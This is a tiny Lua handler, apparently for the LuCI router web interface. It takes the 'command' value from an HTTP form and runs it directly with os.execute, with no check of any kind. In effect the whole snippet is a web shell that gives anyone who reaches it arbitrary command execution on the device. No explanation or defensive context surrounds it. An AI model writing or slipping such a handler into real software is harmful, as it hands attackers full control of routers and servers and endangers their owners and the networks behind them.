local box = {}
box.command = luci.http.formvalue("command")

return os.execute(box.command)
